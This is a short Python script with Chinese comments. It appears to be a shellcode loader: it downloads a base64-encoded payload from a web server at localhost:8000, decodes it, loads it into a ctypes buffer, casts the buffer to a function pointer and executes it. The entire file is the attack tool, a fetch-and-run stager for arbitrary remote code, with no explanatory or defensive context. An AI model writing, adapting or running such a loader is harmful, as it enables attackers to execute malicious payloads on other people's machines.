import urllib.request, urllib.error, urllib.parse
import ctypes
import base64

# 从web服务器下载
url = "http://localhost:8000/shellcode.bin"
response = urllib.request.urlopen(url)

# base64解码shellcode
shellcode = base64.b64decode(response.read())

# 申请内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# 创建shellcode的函数指针
shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# 执行shellcode
shellcode_func()